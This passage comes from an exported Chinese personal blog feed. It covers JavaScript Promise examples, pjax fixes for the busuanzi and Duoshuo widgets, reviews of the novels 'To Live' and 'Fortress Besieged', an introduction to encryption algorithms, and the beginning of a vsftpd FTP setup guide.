class="built_in">console</span>.log(<span class="string">&#x27;用户朋友:&#x27;</span>, res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="3-3-Promise-all"><a href="#3-3-Promise-all" class="headerlink" title="3.3 Promise.all"></a>3.3 Promise.all</h3><p><code>Promise.all</code> 方法用于将多个 <code>Promise</code> 实例，包装成一个新的 <code>Promise</code> 实例。<br><a href="https://jsbin.com/xojifuzapo/1/edit?js,console">在线调试此示例 - jsbin</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 生成一个Promise对象的数组</span></span><br><span class="line"><span class="keyword">var</span> promises = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>].map(<span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (id % <span class="number">3</span> === <span class="number">0</span>) &#123;</span><br><span class="line">      resolve(id)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      reject(id)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">Promise</span>.all(promises).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;全部通过&#x27;</span>)</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;未全部通过，有问题id：&#x27;</span>+reason)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">未全部通过，有问题id：<span class="number">2</span></span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise">mozilla web docs</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>不蒜子适配pjax</title>
    <url>//busuanzi-pjax</url>
    <content><![CDATA[<h2 id="不蒜子一般配置"><a href="#不蒜子一般配置" class="headerlink" title="不蒜子一般配置"></a>不蒜子一般配置</h2><p>加入脚本</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--pv方式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span></span><br><span class="line">    本站总访问量<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_value_site_pv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>次</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--uv方式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_container_site_uv&quot;</span>&gt;</span></span><br><span class="line">  本站访客数<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_value_site_uv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>人次</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--pv方式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_container_page_pv&quot;</span>&gt;</span></span><br><span class="line">  本文总阅读量<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;busuanzi_value_page_pv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>次</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>只安装脚本，不安装标签代码，即可实现只记数，不显示。</p>
<h2 id="适配pjax"><a href="#适配pjax" class="headerlink" title="适配pjax"></a>适配pjax</h2><p>最近开发3-hexo主题，由于主题使用的pjax，异步加载页面时不蒜子会出现加载不到多说js的问题。<br>在pjax：end加载下面js代替标签即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.getScript(<span class="string">&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>人们在一本叫《活着》的书中纷纷死去</title>
    <url>//to-live</url>
    <content><![CDATA[<p>有那么一个年代，离我们很近，它腥风血雨，连活着都是一件奢侈的事。</p>
<p>在富贵的一生中，每次出现看似被上天眷顾的福气后（如有庆长跑第一、凤霞嫁了人并怀了孩子），读者还在替富贵开心的时候，他们却以各种方式迅速死去，最终富贵亲手埋葬了他所有的亲人。</p>
<p>一本 12w 左右的小说，但是在没有华丽词藻的情况下，在顺畅流利的写作手法、跌宕起伏的剧情、第一人称的代入感下一口气读完了。期间多次痛哭流涕（一点儿没夸张），不得不放下书本，洗过脸后才能继续阅读。所以已经多年没写书评的我，还是忍不住为她写下书评。</p>
<blockquote>
<p>人是为了活着本身而活着，而不是为了活着之外的任何事物所活着。</p>
</blockquote>
<p>这是作者在中文序言中的一句话，在当今生活着的我，初读序言中的这句话，并无任何共鸣，甚至还行吐槽两句。随着富贵将他的”一生”娓娓道来，你就会明白在那样的时代背景下，活着已经是一件不容易的事。 所以作者在日文版序言中说到：</p>
<blockquote>
<p>在旁人眼中富贵的一生是苦熬的一生；可是对于富贵自己，我相信他更多地感受到了幸福。</p>
</blockquote>
<p>因为他相信自己的妻子是世上最好的妻子，他相信自己的子女也是世上最好的子女，还有他的女婿他的外孙，还有他的那头也叫富贵的牛，还有一起上火锅的朋友们，还有生活的点点滴滴……</p>
<p>富贵的真是一路跌下去的一生，从”富家少爷”赌光了家产、气死了爹爹。由于母亲生病，为母亲求医路上被国民党抓壮丁，被俘虏后，放回家中。却发现母亲已死，女儿也由于生病变成了聋哑人。本想着大难之后必有后福，却只是悲惨一生的开端。儿子有庆由于和县长夫人血型匹配，遭抽血而亡、女儿凤霞产子大出血而亡、妻子家珍失去儿女后，失去了最后与病魔争斗的信念，也走了、女婿二喜在工地被水泥板拍死、外孙苦根难得吃到豆子，却被豆子撑死。最后只剩下自己和一个也叫作富贵的老牛。</p>
<p>春生想自杀前，找到富贵告别，在被家珍原谅，并答应不会自杀，在这种情况下坚持了一个月，最终还是自杀了。那种时代背景下的无奈，那种窒息感。。。</p>
<p>富贵的一生跨越了地主、解放战争、人民公社运动、大炼钢铁、自然灾害和文化大革命，从一个人的视角看到每个时代下的一个小小的缩影，但却比任何其他的描述更让人深刻了解到这些时代背景下人们的生活状态。</p>
<p>在那时，活着不仅是幸运，也更需要勇气。</p>
<p><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1556806574463&di=868e65579acfc800020db78de3c07ac4&imgtype=0&src=http://s1.sinaimg.cn/large/001Pe7mxzy76VARpXvdc3" class="lazyload" data-srcset="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1556806574463&di=868e65579acfc800020db78de3c07ac4&imgtype=0&src=http://s1.sinaimg.cn/large/001Pe7mxzy76VARpXvdc3" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>读书</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>活着</tag>
      </tags>
  </entry>
  <entry>
    <title>人生若只如初见-《围城》</title>
    <url>//%E4%BA%BA%E7%94%9F%E8%8B%A5%E5%8F%AA%E5%A6%82%E5%88%9D%E8%A7%81-%E3%80%8A%E5%9B%B4%E5%9F%8E%E3%80%8B</url>
    <content><![CDATA[<p><img src="http://img.saodiyang.com/Fg0jOuF4-dBp5moIX00V4Q0X5C11.jpg" class="lazyload" data-srcset="http://img.saodiyang.com/Fg0jOuF4-dBp5moIX00V4Q0X5C11.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="围城"></p>
<blockquote>
<p>婚姻是被围困的城堡，城外的人想冲进去，城里的人想逃出来  –法国谚语</p>
</blockquote>
<span id="more"></span>
<p>方鸿渐对于鲍小姐，不堪抵抗；对于苏小姐的垂青，已再纠缠不清（导致方唐感情破裂的导火索）；最后与孙柔嘉的婚姻，因属于现实的无奈吧；至于唐晓芙，方对她应该有着最纯粹的爱意。</p>
<p>整部小说给我留下深刻印象的就是唐小姐，她在整部小说的占比是非常少的。</p>
<blockquote>
<p>总而言之，唐小姐是摩登文明社会里的那桩罕物――一个真正的女孩子。有许多都市女孩子已经是装模作样的早熟的女人，算不得孩子；有许多女孩子只是浑沌痴顽的无性别的孩子，还说不上女人。</p>
</blockquote>
<p>唐晓芙的聪明漂亮、活泼可爱，令方鸿渐一见倾心。</p>
<p>当初，是苏小姐的干预，激起了唐晓芙的逆反心理，不让接近我偏接近，书信往来，见面谈话，时间推移，俩人都投入了真正的感情。</p>
<p>作为苏的姐妹，唐晓芙骨子里也有跟苏小姐的高傲。</p>
<blockquote>
<p>方先生的过去太丰富了！我爱的人，我要能够占领他整个生命，他在碰见我以前，没有过去，留着空白等待我——</p>
</blockquote>
<p>方下定决心写信给苏撇清两人关系，苏的狭隘的心理从中挑拨导致方与唐之间的破裂</p>
<blockquote>
<p>他象一个受了责骂的孩子那样，泪水在眼睛里打转，却一句话也说不出口。</p>
</blockquote>
<p>所以当唐得知方的一些列斑斑劣迹后，愈心痛愈心恨，最后一次见方，连珠炮的发问，又恨方鸿渐为什么不辩护，她的心溶成了苦水。而方鸿渐的悲剧在于，他再次懦弱，该辩解时不辩解，该在屋外多淋雨时而过早走开，接到电话后，不问来人就大声呵斥，俩人都是好面子的人，看不到俩人为这段感情而去采取任何补救措施，而是各自松开了手。两人年轻，都不知退让，任彼此失之交臂。</p>
<p>从此直到最后，唐也没有再次出现。</p>
<p>但唐给我们的留下了一个近乎完美的形象，正是因为她没有和方走在一起，没有真实世俗的一面，才能留下那种只如初见的模样。</p>
<p>生活亦是如此，我们心目中的“女神”、“男神”，完美无缺的人，是那些我们曾经追求不得的人。想想若是得之，经过世俗的一面，ta的完美的形象，还会在你的心中站的稳吗。</p>
<blockquote>
<p>唐晓芙这个角色是钱老钟爱的角色，是钱老心中完美的女性形象，简单说就是女神！是围城里任何男人都配不上的，所以不舍得把她许配给任何人。</p>
</blockquote>
<div style="text-align:right;width:100%">--杨绛先生</div>

<p><img src="http://img.saodiyang.com/Fp_ZMZN4lHRo5ojcpIn11qoATUt3.jpg" class="lazyload" data-srcset="http://img.saodiyang.com/Fp_ZMZN4lHRo5ojcpIn11qoATUt3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="钱老和杨先生"><br>《围城》写出了婚姻的一方面，但不是全部，很多人要冲进这座城，自有其道理，城中有争吵，但更有温情。愿诸位在现实生活中，相互欣赏，相敬如宾，如初见一样，相互爱戴，生活一定更加美好</p>
<p>在新春佳节祝大家幸福美满，阖家欢乐。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>读书</category>
      </categories>
      <tags>
        <tag>reading</tag>
      </tags>
  </entry>
  <entry>
    <title>加密算法简介</title>
    <url>//encryption-algorithm</url>
    <content><![CDATA[<h2 id="一、对称密钥算法"><a href="#一、对称密钥算法" class="headerlink" title="一、对称密钥算法"></a>一、对称密钥算法</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>对称加密（Symmetric-key algorithm）是指加解密用同一个密钥的算法，根据具体实现分为流加密和分组加密两种类型：</p>
<ul>
<li>流加密（Stream cipher）是对称加密常用的一种实现方法，加密和解密双方使用相同伪随机加密数据流，一般都是逐位异或随机密码本的内容。</li>
<li>分组加密加密（Block cipher），也叫块加密，将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。现代分组加密建立在迭代的思想上产生密文。迭代产生的密文在每一轮加密中使用不同的子密钥，而子密钥生成自原始密钥。</li>
</ul>
<p>对称加密普遍比非对称加密速度要快，实现更简单，适合大量内容的加密</p>
<h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><p>DES (Data Encryption Standard) 是一种分组加密算法</p>
<p>DES算法的入口参数有三个:Key,Data,Mode，Key是密钥密钥占7个字节56位（64位里另外8位是用来校验的），Data是加密内容，占8个字节64位，Mode是加密还是解密。</p>
<p>DES算法于1976被确定，现在已经被认为不够安全，主要原因是56位的密钥过短。据说这个算法因为包含一些机密设计元素，被怀疑内含美国国家安全局（NSA）的后门。</p>
<p>DES算法有个拓展算法叫3DES，就是对数据块进行三次DES加密，增加爆破成本，但本质上也不够安全。</p>
<h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>RC4 (Rivest Cipher 4) 是一种流加密算法</p>
<p>RC4起源于1987年，现在已经被认为不够安全。<br>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。</p>
<p>由于异或运算的对合性，RC4加密解密使用同一套算法。这个算法实现起来很简单，只用了最基本的加、异或、循环，话说我大学时某个课程设计的做的加密算法就是简化版的RC4。</p>
<p>之后还出现了RC5、RC6加密算法，但RC5和RC6都是分组加密，和RC4原理并不一样。</p>
<h3 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h3><p>RC5 （Rivest Cipher 5） 是一种分组加密算法，它和RC2，RC4，RC6都是同一个叫Ronald Rivest的人设计的。</p>
<p>相比RC4，RC5的密钥成了128位，但RC5仍然只需要基础的加、异或、循环运算，可以在很多硬件上实现。RC5有三个参数：字的大小，循环轮数（round），密钥中的8位字节个数，所以可以说RC5是一种可变加密算法。实际上循环轮数12轮以下的RC5都被认为是不安全的，会被差分分析法（Differential cryptanalysis）攻击，18-20轮才足够安全。</p>
<p>目前来说，RC5还是挺安全的，因为实现简单，消耗资源少，在一些传感器、嵌入式设备上使用很合适。</p>
<h3 id="RC6"><a href="#RC6" class="headerlink" title="RC6"></a>RC6</h3><p>RC6 （Rivest Cipher 6） 是RC5的加强版，也属于分组加密算法。</p>
<p>RC6算法在RC5算法基础之上针对RC5算法中的漏洞，主要是循环移位的位移量并不取决于要移动次数的所有比特，通过采用引入乘法运算来决定循环移位次数的方法，对RC5算法进行了改进，从而大大提高了RC6算法的安全性。</p>
<p>RC6曾作为AES（高级加密标准）备选算法之一，但最终AES选择了Rijndael算法。</p>
<h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><p>最后压轴出场的是最著名的单密钥对称加密算法AES (Rijndael)，AES是Advanced Encryption Standard的缩写，是美国国家标准与技术研究院2001年发布的新加密标准。</p>
<p>AES现在就是指的限定了区块长度和密钥长度的Rijndael算法，同样属于分组加密算法，该算法是两位比利时学者1998年发布的。起初还有很多算法参与了AES甄选，最终Rijndael凭借高安全性和清晰的数学结构而被选用。</p>
<p>AES将Rijndael算法的区块长度固定为128位，密钥长度可选128，192或256比特（Rijndael原版支持128-256，n*32的区块长度和密钥长度）。</p>
<p>AES算法包括4个步骤：</p>
<ol>
<li>AddRoundKey—矩阵中的每一个字节都与该次回合密钥（round key）做XOR运算；每个子密钥由密钥生成方案产生。</li>
<li>SubBytes—通过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。</li>
<li>ShiftRows—将矩阵中的每个横列进行循环式移位。</li>
<li>MixColumns—为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略MixColumns步骤，而以另一个AddRoundKey替换。</li>
</ol>
<p>截止现在（2016），AES在算法层面上是安全的。2005年有人公布过一种缓存时序攻击法，但使用场景非常极端。</p>
<h2 id="二、非对称秘钥算法"><a href="#二、非对称秘钥算法" class="headerlink" title="二、非对称秘钥算法"></a>二、非对称秘钥算法</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>公钥加密的思想于1974年被提出，相比对称加密无需共享密钥，更加安全。但是没法加密大量数据，一般用来加密对称加密的密钥，而用对称加密加密大量数据。<br>非对称加密的原理如下：</p>
<ul>
<li>消息发送方A在本地构建密钥对，公钥和私钥；</li>
<li>消息发送方A将产生的公钥发送给消息接收方B；</li>
<li>B向A发送数据时，通过公钥进行加密，A接收到数据后通过私钥进行解密，完成一次通信；</li>
<li>反之，A向B发送数据时，通过私钥对数据进行加密，B接收到数据后通过公钥进行解密。</li>
</ul>
<h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>RSA算法是最著名的非对称加密算法。RSA是1977年提出的，名字来源于Rivest、Shmir和Adleman三位作者。<br>我们平时用到的SSL协议，TLS协议都采用了该算法加密，SSH（Secure Shell）也是基于RSA实现的。</p>
<p>RSA的数学基础是极大整数的因数分解，具体实现过程如下：</p>
<ul>
<li>随意选择两个大的质数p和q，p不等于q，计算N=pq。</li>
<li>根据欧拉函数，求得r=varphi (N) = varphi(p) * varphi(q)=(p-1)(q-1)</li>
<li>选择一个小于r的整数e，使e与r互质。并求得e关于r的模反元素，命名为d。</li>
<li>(N,e)是公钥，(N,d)是私钥。</li>
<li>加密时，加密的块 n^e ≡ c(MOD N)，得到的c就是密文。解密时，c^d ≡ n(MOD N)。</li>
</ul>
<p>要破解RSA要解决怎么把一个极大数分解为两个质数p和q，然后通过欧拉函数再得到公钥和私钥。但极大数因数分解目前还没什么好办法，所以只要N足够大，RSA在算法层面上就是安全的。</p>
<p>当N的长度为256时，用普通电脑花几小时即可以分解，当N长度为512时需要花数月时间分解，1024时需要大型分布式系统才能分解，长度到2046则可以确保是完全安全的。目前已有记录里，被分解的极大数最大位数是768位，于2009年被分解。</p>
<p>RSA也常被用来做数字签名，在消息内附加一个私钥加密过的散列值（Message digest），以此来确保消息发送人是可靠的。<br><strong>公钥私钥对生成</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.该命令会生成1024位的私钥,此时我们就可以在当前路径下看到rsa_private_key.pem文件了.</span></span><br><span class="line">genrsa -out rsa_private_key.pem 1024</span><br><span class="line"><span class="comment"># 2.生成的密钥不是pcs8格式，我们需要转成pkcs8格式</span></span><br><span class="line">pkcs8 -topk8 -inform PEM -<span class="keyword">in</span> rsa_private_key.pem -outform PEM -nocrypt</span><br><span class="line"><span class="comment"># 3.生成 rsa 公钥</span></span><br><span class="line">rsa -<span class="keyword">in</span> rsa_private_key.pem -pubout -out rsa_public_key.pem</span><br></pre></td></tr></table></figure>

<h3 id="椭圆曲线算法"><a href="#椭圆曲线算法" class="headerlink" title="椭圆曲线算法"></a>椭圆曲线算法</h3><p>椭圆曲线算法（Elliptic curve cryptography）也是一种非对称加密算法，于1985年被提出，以下简称ECC。<br>相比RSA，同等破解难度时ECC的秘钥更短。另外，ECC可定义椭圆曲线群的双线性映射，该特性可能将来被用来实现身份基加密体制（Identity-Based Encryption，IBE）。</p>
<p>ECC的数学基础是求椭圆曲线离散对数问题。实现比较复杂我就不写了，因为我也看不懂(⊙﹏⊙)b。 也正因为实现复杂，ECC的加解密速度慢，消耗资源也更多。</p>
<p>ECC也同样可以实现数字签名，叫做ECDSA。</p>
<p>ECC的秘钥长度最小要求是160位，建议是163位。目前已有的破解记录是109位，一万台机器破解了一年半。所以ECC在算法层面是可以保证安全的。</p>
<h3 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h3><p>ElGamal加密算法是一种用于对采用Diff-Hellman方式进行交换的公钥进行加密，常被用于数字签名和密钥加密的算法，ElGamal的数学基础是有限域上的离散对数问题。</p>
<p>选择一个素数p和两个随机数g 、x （g、 x &lt; p ），计算 y ≡ g^x（ mod p ） ，则其公钥为 y, g 和p ，私钥是x ，g和p可由一组用户共享。</p>
<p>ElGamal方法中一个明文对应两个加密结果(g^a和g^b)，因此密文空间的大小是明文空间大小的两倍，也就是说纵观整个通信过程，收发密文的大小是实际明文大小的两倍。</p>
<h2 id="三、哈希算法"><a href="#三、哈希算法" class="headerlink" title="三、哈希算法"></a>三、哈希算法</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>我们经常说MD5加密，但追根究底的话，MD5应该是哈希函数（Hash Function），而哈希函数并不等同于加密（Encrypt），不过我们平常也把哈希叫做加密。哈希函数也叫散列函数，散列函数把消息或数据压缩成摘要，使得数据量变小，将数据的格式固定下来。该函数将数据打乱混合，重新创建一个叫做散列值（hash values，hash codes，hash sums，或hashes）的指纹。散列值通常用来代表一个短的随机字母和数字组成的字符串。</p>
<p>说人话就是哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串，而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。</p>
<p>哈希主要用来校验身份，错误检查，完整性检查。</p>
<h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>MD5（Message-Digest5 Algorithm）即消息摘要算法，是最著名、应用最为广泛的一种哈希算法，于1992年被公开。MD5之前还有MD4、MD3、MD2等哥哥算法，MD5是最终的改进版。</p>
<p>MD5输入不定长度信息，输出固定长度为128-bits的散列</p>
<h2 id="未完-待补充"><a href="#未完-待补充" class="headerlink" title="未完 待补充"></a>未完 待补充</h2><h2 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h2><p><a href="http://woostundy.github.io/2016/07/16/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B/">常见加密算法简介</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>encryption</tag>
      </tags>
  </entry>
  <entry>
    <title>多说适配pjax</title>
    <url>//duoshuo-pjax</url>
    <content><![CDATA[<p>最近开发3-hexo主题，由于主题使用的pjax，异步加载页面时多说会出现加载不到多说js的问题。</p>
<p>多说加载代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加载多说</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadComment</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  duoshuoQuery = &#123;<span class="attr">short_name</span>: $(<span class="string">&quot;.theme_duoshuo_domain&quot;</span>).val()&#125;;</span><br><span class="line">  <span class="keyword">var</span> d = <span class="built_in">document</span>, s = d.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  s.src = <span class="string">&#x27;https://static.duoshuo.com/embed.js?t=&#x27;</span>+<span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span><br><span class="line">  s.async = <span class="literal">true</span>; s.charset = <span class="string">&#x27;UTF-8&#x27;</span>;</span><br><span class="line">  (d.head || d.body).appendChild(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当局部加载页面时，就会无法加载多说。<br>需要编写一个js方法，参考文档：(<a href="http://dev.duoshuo.com/docs/50b344447f32d30066000147">http://dev.duoshuo.com/docs/50b344447f32d30066000147</a>)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pjax后需要回调函数.加载多说</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pajx_loadDuodsuo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> duoshuoQuery ==<span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line">    loadComment();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> dus=$(<span class="string">&quot;.ds-thread&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>($(dus).length==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">      el.setAttribute(<span class="string">&#x27;data-thread-key&#x27;</span>,$(dus).attr(<span class="string">&quot;data-thread-key&quot;</span>));<span class="comment">//必选参数</span></span><br><span class="line">      el.setAttribute(<span class="string">&#x27;data-url&#x27;</span>,$(dus).attr(<span class="string">&quot;data-url&quot;</span>));</span><br><span class="line">      DUOSHUO.EmbedThread(el);</span><br><span class="line">      $(dus).html(el);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在pjax:end中调用此方法即可。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在linux中搭建ftp服务</title>
    <url>//linux-ftp</url>
    <content><![CDATA[<h2 id="什么是-FTP"><a href="#什么是-FTP" class="headerlink" title="什么是 FTP"></a>什么是 FTP</h2><p><code>FTP</code> 是文件传输协议File Transfer Protocol的缩写。顾名思义，FTP用于计算机之间通过网络进行文件传输。你可以通过FTP在计算机账户间进行文件传输，也可以在账户和桌面计算机之间传输文件，或者访问在线软件归档。但是，需要注意的是多数的FTP站点的使用率非常高，可能需要多次重连才能连接上。</p>
<p>FTP地址和HTTP地址（即网页地址）非常相似，只是FTP地址使用 <code>ftp://前缀而不是http://</code></p>
<h2 id="FTP-服务器是什么"><a href="#FTP-服务器是什么" class="headerlink" title="FTP 服务器是什么"></a>FTP 服务器是什么</h2><p>通常，拥有FTP地址的计算机是专用于接收FTP连接请求的。一台专用于接收FTP连接请求的计算机即为FTP服务器或者FTP站点。</p>
<p>现在，我们来开始一个特别的冒险，我们将会搭建一个FTP服务用于和家人、朋友进行文件共享。在本教程，我们将以vsftpd作为ftp服务。</p>
<p>VSFTPD是一个自称为最安全的FTP服务端软件。事实上VSFTPD的前两个字母表示“非常安全的very secure”。该软件的构建绕开了FTP协议的漏洞。</p>
<p>尽管如此，你应该知道还有更安全的方法进行文件管理和传输，如：SFTP（使用OpenSSH）。FTP协议对于共享非敏感数据是非常有用和可靠的。</p>
<h2 id="安装-VSFTP"><a href="#安装-VSFTP" class="headerlink" title="安装 VSFTP"></a>安装 VSFTP</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用 rpm 安装</span></span><br><span class="line">$ dnf -y install vsftpd</span><br><span class="line"><span class="comment">#使用 deb 安装</span></span><br><span class="line">$ sudo apt-get install vsftpd</span><br><span class="line"><span class="comment">#在 Arch 中安装</span></span><br><span class="line">$ sudo pacman -S vsftpd</span><br></pre></td></tr></table></figure>

<h2 id="配置-FTP-服务"><a href="#配置-FTP-服务" class="headerlink" title="配置 FTP 服务"></a>配置 FTP 服务</h2><p>多数的VSFTPD配置项都在/etc/vsftpd.conf配置文件中。这个文件本身已经有非常良好的文档说明了，因此，在本节中，我只强调一些你可能进行修改的重要选项。使用man页面查看所有可用的选项和基本的 文档说明：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ man vsftpd.conf</span><br></pre></td></tr></table></figure>
<p>根据文件系统层级标准，FTP共享文件默认位于/srv/ftp目录中。<br><strong>允许上传：</strong><br>为了允许ftp用户可以修改文件系统的内容，如上传文件等，“write_enable”标志必须设置为 YES</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">write_enable=YES</span><br></pre></td></tr></table></figure>
<p><strong>允许本地（系统）用户登录：</strong><br>为了允许文件/etc/passwd中记录的用户可以登录ftp服务，“local_enable”标记必须设置为YES。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">local_enable=YES</span><br></pre></td></tr></table></figure>
<p><strong>匿名用户登录</strong><br>下面配置内容控制匿名用户是否允许登录：</p>
